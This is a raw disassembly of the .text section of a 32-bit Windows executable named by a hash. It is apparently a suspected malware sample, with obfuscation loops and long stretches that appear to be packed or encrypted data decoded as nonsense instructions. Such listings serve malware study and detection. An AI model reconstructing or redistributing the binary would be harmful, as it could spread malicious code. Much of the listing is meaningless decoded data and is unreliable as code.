
b0fadccbc5b420bc745dc252e07bbd9f8b968e697ee626c54eb45abe4e30f9f0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43458b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x434463
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x4344d3
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x434473,0x4344c7
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43458b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x4344bb,0x10
  40104d:	cmp    DWORD PTR ds:0x4344bb,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x4344bb,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x4344bb,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x4344bb
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x4344bb,ebx
  401095:	mov    ebx,DWORD PTR ds:0x4344bb
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x4344bb,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43458f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x4344df
  4010b6:	mov    ebx,DWORD PTR ds:0x4345b3
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434487,0x43450b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43450f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43450f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43450f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43450f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43450f,0xe
  401103:	jne    0x401119
  401109:	push   0x43446b
  40110e:	push   0x4347db
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43450f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43450f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43450f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x43446b,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xc4231829
  401151:	mov    ecx,0x7e7e7eb1
  401156:	jle    0x40110d
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	(bad)  
  401169:	or     al,0xf
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	enter  0xd9a0,0x49
  401205:	fwait
  401206:	arpl   bp,di
  401208:	inc    eax
  401209:	pop    ebp
  40120a:	aam    0x6a
  40120c:	jns    0x4011d4
  40120e:	js     0x4011bf
  401210:	mov    ?,ebx
  401212:	aas    
  401213:	or     al,0x11
  401215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401216:	adc    eax,0xa1f8916
  40121b:	pop    esi
  40121c:	jns    0x401247
  40121e:	xchg   ebx,eax
  40121f:	or     DWORD PTR [esi],esp
  401221:	clc    
  401222:	add    esp,DWORD PTR [ecx-0x35]
  401225:	push   ebp
  401226:	xor    edx,DWORD PTR [ebx+0x7a]
  401229:	out    dx,eax
  40122a:	xchg   ebx,eax
  40122b:	scas   al,BYTE PTR es:[edi]
  40122c:	dec    eax
  40122d:	in     eax,0x8
  40122f:	add    ebx,edi
  401231:	mov    dh,0xbd
  401233:	xchg   esi,eax
  401234:	out    0xda,al
  401236:	add    BYTE PTR [eax+0x4b89a677],bh
  40123c:	xchg   edx,eax
  40123d:	out    dx,al
  40123e:	xor    dh,BYTE PTR [eax+0x2d]
  401241:	ret    
  401242:	add    eax,0x68945612
  401247:	push   ecx
  401248:	aas    
  401249:	leave  
  40124a:	xchg   esi,eax
  40124b:	sub    ah,BYTE PTR [edx-0x61ec23e9]
  401251:	jnp    0x401248
  401253:	(bad)  
  401254:	shl    BYTE PTR [ebp-0x4c80471b],1
  40125a:	lods   al,BYTE PTR ds:[esi]
  40125b:	mov    esi,0x5e56dab9
  401260:	xor    BYTE PTR [ebp-0x7cb21386],dl
  401266:	sbb    ebp,ebp
  401268:	lea    ebx,[eax+edx*8-0x5a]
  40126c:	mov    ebx,0xec5ec783
  401271:	add    esp,ebx
  401273:	mov    dh,0xf0
  401275:	in     eax,dx
  401276:	mov    esi,0xbb882b49
  40127b:	outs   dx,DWORD PTR ds:[esi]
  40127c:	int    0xf5
  40127e:	mov    cl,0x8c
  401280:	fs cwde 
  401282:	leave  
  401283:	adc    al,0x59
  401285:	jae    0x40124f
  401287:	pop    ebp
  401288:	sbb    eax,0x5b17b976
  40128d:	dec    ebx
  40128e:	dec    edx
  40128f:	int    0x2b
  401291:	mov    esp,0xe8f680af
  401296:	cs call 0xe946:0xe16c042a
  40129e:	cld    
  40129f:	pop    ecx
  4012a0:	pop    ebp
  4012a1:	or     ecx,DWORD PTR ds:0xbb3ee615
  4012a7:	mov    ebp,0x87893276
  4012ac:	dec    esp
  4012ad:	(bad)  
  4012ae:	pop    esp
  4012af:	adc    esi,edi
  4012b1:	in     eax,0x5b
  4012b3:	or     al,0x8c
  4012b5:	stos   BYTE PTR es:[edi],al
  4012b6:	cmp    ah,bh
  4012b8:	xor    dh,BYTE PTR [ebx+0x4ec30f58]
  4012be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012bf:	add    DWORD PTR [ebx+0x37],ecx
  4012c2:	sub    eax,0xc27fab6e
  4012c7:	aam    0xdf
  4012c9:	xchg   edx,eax
  4012ca:	push   esp
  4012cb:	inc    ebx
  4012cc:	ds pop eax
  4012ce:	pop    es
  4012cf:	add    esp,DWORD PTR [ebx]
  4012d1:	dec    ebx
  4012d2:	xchg   DWORD PTR [edi-0x29b187ad],ebx
  4012d8:	push   0x6b
  4012da:	jle    0x4012fb
  4012dc:	mul    cl
  4012de:	aad    0xdd
  4012e0:	push   es
  4012e1:	jne    0x4012e5
  4012e3:	sbb    DWORD PTR [edi],ebp
  4012e5:	mov    ecx,0x65ac2389
  4012ea:	mov    edx,0xa2046c8c
  4012ef:	xchg   edi,eax
  4012f0:	nop
  4012f1:	test   al,0xae
  4012f3:	(bad)  
  4012f4:	xchg   edi,eax
  4012f5:	sbb    DWORD PTR [ecx],esi
  4012f7:	imul   eax,DWORD PTR [esi+eax*1-0x2d],0x6e
  4012fc:	cmp    BYTE PTR [ecx-0x66],dl
  4012ff:	in     eax,dx
  401300:	rol    esi,1
  401302:	and    al,0x6d
  401304:	inc    eax
  401305:	jae    0x4012ef
  401307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401308:	icebp  
  401309:	imul   esi,DWORD PTR [ebp+0x44],0x13749dea
  401310:	inc    ecx
  401311:	push   ebp
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x4344ff,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x4344bf,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x43446f,0x434463
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x434473,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x434543,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x434543
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x434543,ebx
  40137c:	cmp    DWORD PTR ds:0x434543,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x434543,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x434543
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x434543,ebx
  4013ae:	cmp    DWORD PTR ds:0x434543,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x4344bf,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43450b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x43446f,0x4344bf
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x43446b,0x434577
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434483,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [esi-0x40],edx
  401419:	test   BYTE PTR [ebx],dl
  40141b:	mov    ch,0x7f
  40141d:	jle    0x40149d
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	jmp    0x2c42:0x7a4b1472
  40142a:	leave  
  40142b:	mov    dl,0x3d
  40142d:	push   edi
  40142e:	repnz push esi
  401430:	mov    bl,0x13
  401432:	in     al,dx
  401433:	fisttp WORD PTR [ebx+0x36]
  401436:	(bad)  
  401437:	rcr    BYTE PTR [edi-0x36],1
  40143a:	pop    ebp
  40143b:	xchg   esp,eax
  40143c:	sbb    BYTE PTR [edx],ch
  40143e:	fdivr  DWORD PTR [esi]
  401440:	aas    
  401441:	mov    edx,eax
  401443:	and    BYTE PTR [esi+ebx*1],dl
  401446:	outs   dx,BYTE PTR ds:[esi]
  401447:	cmp    edi,DWORD PTR [ebx]
  401449:	cmp    edx,DWORD PTR [edx]
  40144b:	add    al,0xc0
  40144d:	push   ebp
  40144e:	mov    esi,0x41bac25f
  401453:	xchg   edi,eax
  401454:	pop    ds
  401455:	push   0xffffff89
  401457:	in     al,dx
  401458:	sub    dh,BYTE PTR [ebx-0x68]
  40145b:	jnp    0x40140e
  40145d:	dec    ecx
  40145e:	push   esp
  40145f:	sbb    eax,0x64682e92
  401464:	lods   al,BYTE PTR ds:[esi]
  401465:	push   eax
  401466:	or     BYTE PTR ds:0x3e454400,dh
  40146c:	dec    ebp
  40146d:	cdq    
  40146e:	jecxz  0x4014cd
  401470:	mov    esi,0xc07b73b0
  401475:	test   al,0x66
  401477:	cmp    BYTE PTR [ebp+0x52],cl
  40147a:	out    dx,eax
  40147b:	test   al,0x32
  40147d:	and    DWORD PTR [esi+0x31],ebx
  401480:	data16 inc BYTE PTR ds:[ecx-0x7301a4b8]
  401488:	mov    eax,0x406e368
  40148d:	sub    eax,DWORD PTR [edi-0x5d573bb3]
  401493:	outs   dx,BYTE PTR ds:[esi]
  401494:	dec    esp
  401495:	dec    ebx
  401496:	inc    eax
  401497:	mov    eax,0x19458ed1
  40149c:	in     eax,0xe
  40149e:	test   esp,0xf32cad0c
  4014a4:	mov    dh,0xc1
  4014a6:	xchg   edi,eax
  4014a7:	lds    eax,FWORD PTR [ebp+ebx*4+0x5]
  4014ab:	pop    esp
  4014ac:	daa    
  4014ad:	(bad)  
  4014ae:	inc    esp
  4014b0:	(bad)  
  4014b1:	loope  0x40147c
  4014b3:	shl    BYTE PTR [esp+eiz*8-0x62],0x91
  4014b8:	imul   ebx,edx,0xffffffa2
  4014bb:	je     0x401469
  4014bd:	ins    BYTE PTR es:[edi],dx
  4014be:	hlt    
  4014bf:	push   es
  4014c0:	inc    esi
  4014c1:	test   DWORD PTR [edx],ebp
  4014c3:	or     al,0x90
  4014c5:	and    edx,DWORD PTR [edi]
  4014c7:	mov    edx,0x3571b2a1
  4014cc:	inc    eax
  4014cd:	in     al,dx
  4014ce:	xor    DWORD PTR [esp+edx*2-0x6e37fa3d],0xffffffbc
  4014d6:	dec    eax
  4014d7:	into   
  4014d8:	(bad)  
  4014d9:	jge    0x4014e3
  4014db:	inc    ecx
  4014dc:	outs   dx,DWORD PTR ds:[esi]
  4014dd:	je     0x4014d3
  4014df:	das    
  4014e0:	mov    edx,0x1ac846e4
  4014e5:	jge    0x401546
  4014e7:	loop   0x401532
  4014e9:	xor    DWORD PTR [ecx+0x4847d129],edx
  4014ef:	sub    eax,0x4a9ded7e
  4014f4:	aas    
  4014f5:	push   es
  4014f6:	mov    ah,0xd3
  4014f8:	test   BYTE PTR [edi],al
  4014fa:	adc    bh,BYTE PTR [edx-0x66dfe5a5]
  401500:	mov    cl,BYTE PTR [ecx]
  401502:	nop
  401503:	add    BYTE PTR [ebp+0x1d453b1f],0x3c
  40150a:	push   cs
  40150b:	lods   al,BYTE PTR ds:[esi]
  40150c:	test   BYTE PTR [edx-0x7e],dh
  40150f:	mov    al,0x68
  401511:	push   esp
  401512:	cs ins BYTE PTR es:[edi],dx
  401514:	xchg   BYTE PTR [esi-0x2f],bh
  401517:	cmp    eax,DWORD PTR [eax-0xe296899]
  40151d:	and    BYTE PTR [eax+0x332ea5d3],0xfb
  401524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401525:	ins    BYTE PTR es:[edi],dx
  401526:	push   eax
  401527:	xchg   ebp,eax
  401528:	mov    bl,0xaa
  40152a:	cmp    ecx,ebx
  40152c:	mov    cl,0x12
  40152e:	(bad)  
  40152f:	adc    al,0x46
  401531:	ins    BYTE PTR es:[edi],dx
  401532:	add    ah,BYTE PTR [edi]
  401534:	mov    ds:0x78fba2da,eax
  401539:	sub    eax,0x1dfa2818
  40153e:	cmp    eax,0xe497dc5
  401543:	(bad)  
  401545:	cld    
  401546:	jno    0x40157a
  401548:	pop    esp
  401549:	fsubr  DWORD PTR ds:0x222189f
  40154f:	dec    esp
  401550:	adc    ah,bl
  401552:	data16 sub BYTE PTR [ecx+0x2496d1b8],ch
  401559:	mov    edx,0xe1b2a539
  40155e:	mov    ecx,0xb8993902
  401563:	xor    eax,0xd7b5379
  401568:	cmp    BYTE PTR [edx-0x8],ah
  40156b:	and    ch,BYTE PTR [edx-0x276360b9]
  401571:	(bad)  
  401572:	pop    cx
  401574:	pushf  
  401575:	dec    eax
  401576:	and    al,0xe4
  401578:	stos   DWORD PTR es:[edi],eax
  401579:	test   DWORD PTR [eax],edi
  40157b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40157c:	in     al,0x64
  40157e:	and    esi,DWORD PTR [ebp+eax*2-0x4]
  401582:	test   al,0x68
  401584:	mov    edx,0x904702d1
  401589:	add    ah,BYTE PTR [edx]
  40158b:	mov    ds:0x9ead9e97,al
  401590:	mov    ah,0xec
  401592:	mov    ebx,0xe51ee4c3
  401597:	adc    BYTE PTR [esi+0x51300a72],bl
  40159d:	sub    ebx,DWORD PTR [ebx-0xc]
  4015a0:	inc    ecx
  4015a1:	and    ebp,eax
  4015a3:	pop    ecx
  4015a4:	not    BYTE PTR [eax+0x7b]
  4015a7:	aam    0x53
  4015a9:	bound  eax,QWORD PTR [ebx+0x77]
  4015ac:	xchg   esi,eax
  4015ad:	outs   dx,BYTE PTR ds:[esi]
  4015ae:	mov    dh,0x5c
  4015b0:	inc    edi
  4015b1:	pop    esp
  4015b2:	fwait
  4015b3:	stos   DWORD PTR es:[edi],eax
  4015b4:	inc    esp
  4015b5:	test   DWORD PTR [ebx],eax
  4015b7:	or     DWORD PTR [edx],ecx
  4015b9:	(bad)  
  4015ba:	fisttp WORD PTR [eax]
  4015bc:	into   
  4015bd:	lahf   
  4015be:	mov    ebx,0xc94ea0ad
  4015c3:	dec    ebp
  4015c4:	push   ss
  4015c5:	inc    eax
  4015c6:	pop    ebp
  4015c7:	mov    ?,WORD PTR [esi]
  4015c9:	inc    ecx
  4015ca:	push   ebp
  4015cb:	adc    BYTE PTR [edi+0x77],0x84
  4015cf:	(bad)
  4015d4:	std    
  4015d5:	dec    eax
  4015d6:	inc    esi
  4015d7:	push   ss
  4015d8:	icebp  
  4015d9:	pop    eax
  4015da:	mov    eax,DWORD PTR [ebp+0x8]
  4015dd:	mov    ecx,DWORD PTR ds:0x43458f
  4015e3:	and    DWORD PTR ds:0x43453f,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x434463,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x4344c3,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434513,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434503,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434503
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434503,ecx
  40162d:	cmp    DWORD PTR ds:0x434503,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434503,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434503
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434503,ecx
  40165f:	cmp    DWORD PTR ds:0x434503,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x4344a3
  401674:	mov    eax,ds:0x4344eb
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x43454b,0x434577
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x43446b,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x43446f,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	popf   
  4016ba:	pusha  
  4016bb:	div    dh
  4016bd:	in     al,dx
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x401739
  4016c6:	test   eax,0xa4c90f88
  4016cb:	shufps xmm7,xmm1,0xde
  4016cf:	bound  esi,QWORD PTR [edi+0x5f]
  4016d2:	add    eax,0x5a29f66e
  4016d7:	or     bl,cl
  4016d9:	mov    ds:0x480a4096,eax
  4016de:	mov    ds:0xadc5a9de,al
  4016e3:	ins    DWORD PTR es:[edi],dx
  4016e4:	aas    
  4016e5:	clc    
  4016e6:	out    dx,al
  4016e7:	sub    DWORD PTR [ebx*2+0x21521ce1],eax
  4016ee:	and    eax,0x241d20b
  4016f3:	jl     0x401754
  4016f5:	outs   dx,DWORD PTR ds:[esi]
  4016f6:	cmc    
  4016f7:	aam    0x7d
  4016f9:	pop    ss
  4016fa:	pop    ecx
  4016fb:	mov    es:0x5f0eeedc,eax
  401701:	clc    
  401702:	cmp    cl,BYTE PTR [edx+0x510e31ca]
  401708:	(bad)  
  401709:	cdq    
  40170a:	add    ch,al
  40170c:	dec    eax
  40170d:	pop    ebp
  40170e:	dec    ebx
  40170f:	dec    ebp
  401710:	test   DWORD PTR fs:[edi],ebx
  401713:	push   eax
  401714:	jb     0x40177b
  401716:	loope  0x40171b
  401718:	shl    DWORD PTR [edi+0x4],cl
  40171b:	lods   eax,DWORD PTR ds:[esi]
  40171c:	into   
  40171d:	cs sbb eax,0x65964cc3
  401723:	arpl   ax,cx
  401725:	nop
  401726:	inc    ecx
  401727:	(bad)  [eax+0x138e1259]
  40172d:	das    
  40172e:	pop    esp
  40172f:	jnp    0x40174e
  401731:	or     BYTE PTR [ebp+0x7bce3bc6],bl
  401737:	push   ds
  401738:	daa    
  401739:	std    
  40173a:	adc    al,0xd1
  40173c:	push   0x4e
  40173e:	sbb    ah,ah
  401740:	and    BYTE PTR ds:0x65599a8,0xce
  401747:	repz fadd st,st(7)
  40174a:	iret   
  40174b:	or     bl,cl
  40174d:	je     0x40171a
  40174f:	sub    BYTE PTR [edx],dl
  401751:	je     0x401739
  401753:	inc    edx
  401754:	js     0x401726
  401756:	jmp    0x4017d1
  401758:	mov    ds:0x11dcd796,al
  40175d:	iret   
  40175e:	pop    ebx
  40175f:	icebp  
  401760:	inc    ebp
  401761:	daa    
  401762:	fstp   DWORD PTR [edx-0x774cfb63]
  401768:	sub    BYTE PTR [ebx+0x4a],ah
  40176b:	jns    0x40178e
  40176d:	jo     0x40175d
  40176f:	xchg   edi,eax
  401770:	imul   ecx,DWORD PTR [esi],0xfffffffb
  401773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401774:	js     0x4017f1
  401776:	int    0x4c
  401778:	fwait
  401779:	js     0x4017a2
  40177b:	add    al,0x80
  40177d:	retfw  
  40177f:	or     eax,0xf9b923b0
  401784:	test   BYTE PTR [esi-0x80],dl
  401787:	mov    dl,0x9a
  401789:	mov    al,0x38
  40178b:	lods   eax,DWORD PTR ds:[esi]
  40178c:	ret    0x9835
  40178f:	and    dl,BYTE PTR [eax+ebp*1-0x68670dbd]
  401796:	add    ch,0xb7
  401799:	(bad)  
  40179a:	cmp    al,0xe1
  40179c:	jecxz  0x4017fd
  40179e:	test   ch,dh
  4017a0:	enter  0xc423,0x74
  4017a4:	inc    eax
  4017a5:	cli    
  4017a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017a7:	push   esp
  4017a8:	sbb    esi,0x4c
  4017ab:	xor    al,al
  4017ad:	sub    DWORD PTR [edx+ecx*8-0x62b1157f],esp
  4017b4:	fisubr WORD PTR [esi+ebp*1]
  4017b7:	pop    ebp
  4017b8:	add    al,0x7b
  4017ba:	sub    eax,0x1ac856bf
  4017bf:	out    dx,al
  4017c0:	add    bl,dl
  4017c2:	push   esp
  4017c3:	aam    0xc9
  4017c5:	sub    eax,0x36373fd1
  4017ca:	push   ecx
  4017cb:	and    bh,BYTE PTR [esi-0x43]
  4017ce:	cmp    ecx,DWORD PTR [edi-0x286cec00]
  4017d4:	repz in eax,dx
  4017d6:	inc    ebx
  4017d7:	adc    dh,BYTE PTR [esp+edi*8+0x65]
  4017db:	pop    ebx
  4017dc:	inc    eax
  4017dd:	push   esp
  4017de:	and    bh,BYTE PTR [ebx]
  4017e0:	adc    BYTE PTR [edi+esi*4+0x31],dh
  4017e4:	mov    bl,0xc0
  4017e6:	je     0x40183a
  4017e8:	test   BYTE PTR [ecx-0x4e],al
  4017eb:	xlat   BYTE PTR ds:[ebx]
  4017ec:	pop    edi
  4017ed:	push   esi
  4017ee:	push   esp
  4017ef:	aas    
  4017f0:	mov    dh,0xb3
  4017f3:	cli    
  4017f4:	lea    esi,[ebp-0x15133806]
  4017fa:	sub    al,0x45
  4017fc:	das    
  4017fd:	jbe    0x40180e
  4017ff:	pop    ebp
  401800:	pop    edi
  401801:	adc    eax,0xaac7ebf7
  401806:	lds    ecx,FWORD PTR [ebx]
  401808:	loopne 0x4017ed
  40180a:	xchg   esi,eax
  40180b:	and    al,dl
  40180d:	add    al,0x23
  40180f:	adc    eax,0x4594afdc
  401814:	fs ret 0xcabb
  401818:	cli    
  401819:	push   0x2516dc71
  40181e:	mov    ebp,0x9232f7f
  401823:	je     0x40188b
  401825:	xchg   edi,eax
  401826:	cmc    
  401827:	add    al,BYTE PTR [eax]
  401829:	lods   al,BYTE PTR ds:[esi]
  40182a:	lods   eax,DWORD PTR ds:[esi]
  40182b:	mov    ch,BYTE PTR [ebp+0x3160b828]
  401831:	loopne 0x401836
  401833:	(bad)  
  401835:	hlt    
  401836:	sub    al,0x5e
  401838:	cld    
  401839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40183a:	ins    BYTE PTR es:[edi],dx
  40183b:	loop   0x4017df
  40183d:	xchg   edx,eax
  40183e:	aas    
  40183f:	loope  0x401876
  401841:	jns    0x40184a
  401843:	ja     0x4017ee
  401845:	lods   al,BYTE PTR ds:[esi]
  401846:	add    al,0xfc
  401848:	xchg   edi,eax
  401849:	or     esp,DWORD PTR [esi+0x1d]
  40184c:	push   ds
  40184d:	imul   ecx,DWORD PTR [edi+0x5399b53c],0x2bffcdf
  401857:	fdivr  DWORD PTR [ecx+0x37c8fd60]
  40185d:	adc    ecx,DWORD PTR [ecx-0x5c]
  401860:	dec    ecx
  401861:	sub    al,0x48
  401863:	rcr    DWORD PTR [ebx+0x59],1
  401866:	jg     0x401876
  401868:	xchg   edx,eax
  401869:	dec    ebp
  40186a:	mov    dl,0x60
  40186c:	push   ebx
  40186d:	jmp    0x1297:0x91872a0c
  401874:	jbe    0x4018c6
  401876:	add    eax,0xbb3951b9
  40187b:	jnp    0x40188c
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4345830d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x434463
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [ebx],bh
  4018a0:	sbb    al,0x7c
  4018a2:	bndstx [ebx+0x7e],(bad)
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x4018d1
  4018ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018ad:	nop
  4018ae:	jnp    0x4018cd
  4018b0:	popf   
  4018b1:	mov    dh,BYTE PTR [ebx-0x72164909]
  4018b7:	imul   ebx,DWORD PTR ds:0xe1dc948,0x244b2ff1
  4018c1:	mov    bh,0x4a
  4018c3:	int3   
  4018c4:	icebp  
  4018c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018c6:	das    
  4018c7:	xchg   ebx,eax
  4018c8:	push   ebx
  4018c9:	xor    eax,0xe0cd485b
